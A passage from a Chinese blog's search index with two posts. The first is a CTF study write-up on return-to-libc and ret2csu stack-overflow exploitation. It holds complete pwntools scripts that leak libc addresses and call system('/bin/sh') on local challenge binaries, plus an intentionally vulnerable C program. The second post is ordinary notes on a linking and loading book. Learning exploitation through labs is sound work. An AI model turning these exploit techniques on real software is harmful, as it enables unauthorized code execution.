class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># ret2libc2 -无/bin/sh，有system-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/ctf-wiki/wiki原题目/ret2libc2&quot;</span>)</span><br><span class="line">system_plt=<span class="number">0x08048490</span></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x0804A080</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>,gets_plt,pop_ebx_ret,buf2,system_plt,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,buf2])</span><br><span class="line"><span class="comment">#payload = flat([&#x27;a&#x27;*0x70,gets_plt,system_plt,buf2,buf2])</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>​    对两种都能打通的payload进行说明</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一种</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>,gets_plt,pop_ebx_ret,buf2,system_plt,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,buf2])</span><br><span class="line"><span class="comment"># 第二种</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>,gets_plt,system_plt,buf2,buf2])</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="第一种payload的解释："><a href="#第一种payload的解释：" class="headerlink" title="第一种payload的解释："></a>第一种payload的解释：</h4><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230116/%E5%9B%BE%E7%89%87.46pvik70tcow.webp"></p><p>​    当gets函数执行完毕后，<code>esp</code>会指向到gets函数的返回地址，此时<code>esp</code>距离<code>system_plt</code>还差八个字节，因为<code>pop_ebx_ret</code>将使esp自增两次（每次增4）故最后能够指向<code>system_plt</code>从而顺利地调用system函数。</p><h4 id="第二种payload的解释："><a href="#第二种payload的解释：" class="headerlink" title="第二种payload的解释："></a>第二种payload的解释：</h4><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230116/%E5%9B%BE%E7%89%87.5t87trit7ke8.webp"></p><p>​    当gets函数执行完毕后，直接跳转到调用system函数的地址，从而顺利调用system函数。</p><p>​    参考文章：<a class="link" href="https://mzgao.blog.csdn.net/article/details/104321534">点击此处跳转<i class="fas fa-external-link-alt"></i></a></p><h3 id="7-ret2libc3"><a href="#7-ret2libc3" class="headerlink" title="7.ret2libc3"></a>7.ret2libc3</h3><p>​    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ret2libc2  - 无/bin/sh，无system -</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/ctf-wiki/wiki原题目/ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">celf = ELF(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/ctf-wiki/wiki原题目/ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = celf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = celf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = celf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;leak libc_start_main_got addr and return to main again!&quot;)</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>,puts_plt,main,libc_start_main_got])</span><br><span class="line">c.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u32(c.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;__libc_start_main&quot;</span>,libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;get flag&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">104</span>,system_addr,<span class="string">&#x27;aaaa&#x27;</span>,bin_sh])</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>​    经过测试，<code>LibcSearcher</code>搜到的三个偏移都不行，如下情况：（我们选择自己尝试，不当脚本小子！）</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230116/%E5%9B%BE%E7%89%87.kchnb6ohf1c.webp"></p><p>​        <a class="link" href="https://blog.csdn.net/qq_21746331/article/details/113546124?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167387403516800192239160%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167387403516800192239160&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-113546124-null-null.142%5Ev71%5Ewechat,201%5Ev4%5Eadd_ask&utm_term=libc%20database%20search&spm=1018.2226.3001.4187">0x5 libc database search介绍<i class="fas fa-external-link-alt"></i></a></p><p>​        <a class="link" href="https://blog.csdn.net/iamwenyifuxing/article/details/114301229?ops_request_misc=&request_id=&biz_id=102&utm_term=objdump%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-114301229.142%5Ev71%5Ewechat,201%5Ev4%5Eadd_ask&spm=1018.2226.3001.4187">objdump使用方法<i class="fas fa-external-link-alt"></i></a></p><p>利用objdump手动得到<code>puts_plt</code>和<code>libc_start_main_got</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230116/%E5%9B%BE%E7%89%87.75amggzdaxds.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230116/%E5%9B%BE%E7%89%87.427b7iwwi4lc.webp"></p><p>​    更简便的方法就是使用<code>ELF</code>:</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230116/%E5%9B%BE%E7%89%87.24qwzpeh3pj4.webp"></p><p>​    但是很奇怪，手动还是打不通：<strong>不知道错在哪里</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/ctf-wiki/wiki原题目/ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">celf = ELF(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/ctf-wiki/wiki原题目/ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = celf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = celf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = celf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>,puts_plt,main,libc_start_main_got])</span><br><span class="line">c.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u32(c.recv(<span class="number">4</span>))</span><br><span class="line">libcbase = libc_start_main_addr - <span class="number">0x015de0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-----------------------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main_addr))</span><br><span class="line"><span class="built_in">print</span>(libcbase)</span><br><span class="line">system_addr = libcbase +  <span class="number">0x035fd0</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x10d32a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">104</span>,system_addr,bin_sh])</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230116/%E5%9B%BE%E7%89%87.2y5i3tko1q4g.webp"></p><h2 id="四、中级ROP"><a href="#四、中级ROP" class="headerlink" title="四、中级ROP"></a>四、中级ROP</h2><blockquote><p>中级 ROP 主要是使用了一些比较巧妙的 Gadgets。</p></blockquote><h3 id="1-ret2csu"><a href="#1-ret2csu" class="headerlink" title="1.ret2csu"></a>1.ret2csu</h3><p>​    在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。</p><blockquote><p>64位传参寄存器依次为：rdi,rsi,rdx,rcx,r8,r9。多余的参数和32位一样，被压入栈中。</p></blockquote><p>​    这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc  进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.33ziyl2oa1ts.webp"></p><p>参考：<a class="link" href="https://blog.csdn.net/qq_33733970/article/details/78572733?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167556471416782425198404%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167556471416782425198404&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-78572733-null-null.142%5Ev73%5Ewechat,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=%E6%B1%87%E7%BC%96%20jnz&spm=1018.2226.3001.4187">常用汇编指令<i class="fas fa-external-link-alt"></i></a></p><p>这里我们可以利用以下几点</p><ul><li>从 0x040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。</li><li>从 0x0400600 到 0x0400609，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0</strong>），所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制  r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</li><li>从 0x040060D 到 0x0400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。</li></ul><p>这里我们以蒸米的一步一步学 ROP 之 linux_x64 篇中 level5 为例进行学习。</p><p><a class="link" href="https://wooyun.js.org/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html">原文链接<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># level5.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable_function</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个程序仅仅只有一个buffer  overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段,  最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。<mark>我们使用ROPgadget并没有找到类似于<code>pop rdi, ret</code>,<code>pop rsi, ret</code>这样的gadgets</mark>。(如果有则使用<code>ret2libc3</code>)</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.49kv9yn9wj28.webp"></p><p>程序为 64 位，开启了堆栈不可执行保护。</p><p>其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.2jibrdwf3gg0.webp"></p><p>简单浏览下程序，发现程序中既没有 system 函数地址，也没有 <code>/bin/sh</code> 字符串，所以两者都需要我们自己去构造了。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.6gkb8r7bcjuo.webp"></p><p><strong>基本利用思路如下</strong></p><ul><li>利用栈溢出执行 libc_csu_gadgets 获取 write 函数地址，并使得程序重新执行 main 函数</li><li>根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址</li><li>再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 ‘/bin/sh’ 地址，并使得程序重新执行 main 函数。</li><li>再次利用栈溢出执行 libc_csu_gadgets 执行 execve(‘/bin/sh’) 获取 shell。</li></ul><p>详情参考此篇文章：<a class="link" href="https://blog.csdn.net/qq_41202237/article/details/105913597?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167556684916800182734027%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167556684916800182734027&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105913597-null-null.142%5Ev73%5Ewechat,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=ret2csu&spm=1018.2226.3001.4187">ret2csu<i class="fas fa-external-link-alt"></i></a> （这篇文章已经讲的很详细了，在此不再赘述）</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 假期学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《程序员的自我修养:链接装载与库》笔记</title>
      <link href="/2023/01/11/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/01/11/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>The more u learn, the less u know.</p></blockquote><span id="more"></span><h1 id="一、本书总概"><a href="#一、本书总概" class="headerlink" title="一、本书总概"></a>一、本书总概</h1><h2 id="1-大致内容"><a href="#1-大致内容" class="headerlink" title="1.大致内容"></a>1.大致内容</h2><blockquote><ol><li>本书将详细描述现在流行的Windows和Linux操作系统下各自的可执行文件、目标文件格式；</li><li>普通C/C++程序代码如何被编译成目标文件及程序在目标文件中如何存储；</li><li>目标文件如何被链接器链接到一起，并且形成可执行文件；</li><li>目标文件在链接时符号处理、重定位和地址分配如何进行；</li><li>可执行文件如何被装载并且执行；</li><li>可执行文件与进程的虚拟空间之间如何映射；</li><li>什么是动态链接，为什么要进行动态链接；</li><li>Windows和Linux如何进行动态链接及动态链接时的相关问题；</li><li>什么是堆，什么是栈；</li><li>函数调用惯例；</li><li>运行库，Glibc和MSVC CRT的实现分析；</li><li>系统调用与API；</li><li>最后我们自己还实现了一个Mini CRT。</li></ol></blockquote><h2 id="2-文章目录"><a href="#2-文章目录" class="headerlink" title="2.文章目录"></a>2.文章目录</h2><h3 id="第1章-温故而知新"><a href="#第1章-温故而知新" class="headerlink" title="第1章 温故而知新"></a>第1章 温故而知新</h3><p>​        介绍基本的背景知识，包括硬件、操作系统、线程等。</p><h3 id="第2章-编译和链接"><a href="#第2章-编译和链接" class="headerlink" title="第2章 编译和链接"></a>第2章 编译和链接</h3><p>​        介绍编译和链接的基本概念和步骤。</p><h3 id="第3章-目标文件里有什么"><a href="#第3章-目标文件里有什么" class="headerlink" title="第3章 目标文件里有什么"></a>第3章 目标文件里有什么</h3><p>​        介绍COFF目标文件格式和源代码编译后如何在目标文件中存储。</p><h3 id="第4章-静态链接"><a href="#第4章-静态链接" class="headerlink" title="第4章 静态链接"></a>第4章 静态链接</h3><p>​        介绍静态链接与静态库链接的过程和步骤。</p><h3 id="第5章-Windows-PE-COFF"><a href="#第5章-Windows-PE-COFF" class="headerlink" title="第5章 Windows PE/COFF"></a>第5章 Windows PE/COFF</h3><p>​        介绍Windows平台的目标文件和可执行文件格式。</p><h3 id="第6章-可执行文件的装载与进程"><a href="#第6章-可执行文件的装载与进程" class="headerlink" title="第6章 可执行文件的装载与进程"></a>第6章 可执行文件的装载与进程</h3><p>​        介绍进程的概念、进程地址空间的分布和可执行文件映射装载过程。</p><h3 id="第7章-动态链接"><a href="#第7章-动态链接" class="headerlink" title="第7章 动态链接"></a>第7章 动态链接</h3><p>​        以Linux下的.so共享库为基础详细分析了动态链接的过程。</p><h3 id="第8章-Linux共享库的组织"><a href="#第8章-Linux共享库的组织" class="headerlink" title="第8章 Linux共享库的组织"></a>第8章 Linux共享库的组织</h3><p>​        介绍Linux下共享库文件的分布和组织。</p><h3 id="第9章-Windows下的动态链接"><a href="#第9章-Windows下的动态链接" class="headerlink" title="第9章 Windows下的动态链接"></a>第9章 Windows下的动态链接</h3><p>​        介绍Windows系统下DLL动态链接机制。</p><h3 id="第10章-内存"><a href="#第10章-内存" class="headerlink" title="第10章 内存"></a>第10章 内存</h3><p>​        主要介绍堆与栈，堆的分配算法，函数调用栈分布。</p><h3 id="第11章-运行库"><a href="#第11章-运行库" class="headerlink" title="第11章 运行库"></a>第11章 运行库</h3><p>​        主要介绍运行库的概念、C/C++运行库、Glibc和MSVC CRT、运行库如何实现C++全局构造和析构及以fread()库函数为例对运行库进行剖析。</p><h3 id="第12章-系统调用与API"><a href="#第12章-系统调用与API" class="headerlink" title="第12章 系统调用与API"></a>第12章 系统调用与API</h3><p>​        主要介绍Linux和Windows的系统调用及Windows 的API。</p><h3 id="第13章-运行库实现"><a href="#第13章-运行库实现" class="headerlink" title="第13章 运行库实现"></a>第13章 运行库实现</h3><p>​        本章主要实现了一个支持堆、基本文件操作、格式化字符串、基本输入输出、C++ new/delete、C++ string、C++全局构造和析构的Mini CRT。</p><h1 id="二、第一章"><a href="#二、第一章" class="headerlink" title="二、第一章"></a>二、第一章</h1><h2 id="1-由Hello-World程序引出的问题"><a href="#1-由Hello-World程序引出的问题" class="headerlink" title="1.由Hello World程序引出的问题"></a>1.由Hello World程序引出的问题</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello World\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ol><li>程序为什么要被编译器编译了之后才可以运行？</li><li>编译器在把C语言程序转换成可以执行的机器码的过程中做了什么，怎么做的？</li><li>最后编译出来的可执行文件里面是什么？除了机器码还有什么？它们怎么存放的，怎么组织的？</li><li>#include &lt;stdio.h&gt;是什么意思？把stdio.h包含进来意味着什么？C语言库又是什么？它怎么实现的？</li><li>不同的编译器（Microsoft VC、GCC）和不同的硬件平台（x86、SPARC、MIPS、ARM），以及不同的操作系统（Windows、Linux、UNIX、Solaris），最终编译出来的结果一样吗？为什么？</li><li>Hello World程序是怎么运行起来的？操作系统是怎么装载它的？它从哪儿开始执行，到哪儿结束？main函数之前发生了什么？main函数结束以后又发生了什么？</li><li>如果没有操作系统，Hello World可以运行吗？如果要在一台没有操作系统的机器上运行Hello World需要什么？应该怎么实现？</li><li>printf是怎么实现的？它为什么可以有不定数量的参数？为什么它能够在终端上输出字符串？</li><li>Hello World程序在运行时，它在内存中是什么样子的？</li></ol></blockquote><p>​    对于我在一年半前就很熟悉的简单的C程序，上面的9个问题我只能很浅地回答几个，大部分都非常模棱两可，希望能够在阅读本书的同时能够提升我对Hello World程序的理解并能够开始回答上面九个问题吧。(如果还能够提出自己发现的问题那就更好了。)</p><h2 id="2-再回首：计算机相关基础知识"><a href="#2-再回首：计算机相关基础知识" class="headerlink" title="2.再回首：计算机相关基础知识"></a>2.再回首：计算机相关基础知识</h2><p><strong>1.</strong> 早期的计算机没有很复杂的图形功能，CPU的核心频率也不高，跟内存的频率一样，它们都是直接连接在同一个总线（Bus）上的。为了协调I/O设备与总线之间的速度，也为了能够让CPU能够和I/O设备进行通信，一般每个设备都会有一个相应的I/O控制器。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.6kie90plsps0.webp"></p><p>​                                        （图1-1 早期的计算机硬件结构 ）</p><p><strong>2.北桥与南桥芯片</strong>：为了协调CPU、内存和高速的图形设备，人们专门设计了一个高速的北桥芯片（Northbridge，PCI Bridge），以便它们之间能够高速地交换数据。由于北桥运行的速度非常高，所有相对低速的设备如果全都直接连接在北桥上，北桥既须处理高速设备，又须处理低速设备，设计就会十分复杂。于是人们又设计了专门处理低速设备的南桥（Southbridge）芯片，磁盘、USB、键盘、鼠标等设备都连接在南桥上，由南桥将它们汇总后连接到北桥上。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.580j3n7mklfk.webp"></p><p><strong>3.SMP与多核</strong>：</p><ul><li><strong>对称多处理器（SMP，Symmetrical Multi Processing）</strong>，简单地讲就是每个CPU在系统中所处的地位和所发挥的功能都是一样的，是相互对称的。</li><li>理论上讲，增加CPU的数量就可以提高运算速度，并且理想情况下，速度的提高与CPU的数量成正比。但实际上并非如此，因为我们的程序并不是都能分解成若干个完全不相干的子问题。</li><li>多核处理器<strong>（Multi-core Processor）</strong>实际上就是SMP的简化版，当然它们在细节上还有一些差别，只是多核和SMP在缓存共享等方面有细微的差别，使得程序在优化上可以有针对性地处理。</li></ul><p><strong>4.系统软件</strong>：</p><ul><li>传统意义上一般将用于管理计算机本身的软件称为系统软件，以区别普通的应用程序。</li><li>一类是平台性的，比如操作系统内核、驱动程序、运行库和数以千计的系统工具。</li><li>另外一类是用于程序开发的，比如编译器、汇编器、链接器等开发工具和开发库。</li><li>计算机系统软件体系结构采用一种层的结构。</li><li>Linux使用0x80号中断作为系统调用接口。</li></ul><p><strong>5.操作系统</strong>：</p><ul><li><p>操作系统的一个功能是提供抽象的接口，另外一个主要功能是管理硬件资源。</p></li><li><p>多道程序（Multiprogramming）</p></li><li><p>分时系统（Time-Sharing System）</p></li><li><p><strong>多任务（Multi-tasking）系统</strong>：</p></li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.3mfrj89mh1mo.webp"></p><ul><li>驱动程序可以看作是操作系统的一部分，它往往跟操作系统内核一起运行在特权级，但它又与操作系统内核之间有一定的独立性，使得驱动程序有比较好的灵活性。</li></ul><p><strong>6.一次读取文件例子的分析：</strong></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.5bths8zui874.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.7elw6au6z4zk.webp"></p><p>7.一些名词：</p><ul><li><p>分段（Segmentation）</p></li><li><p>分页（Paging）</p></li></ul><hr><p>P34 2023年1月11日</p><hr>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
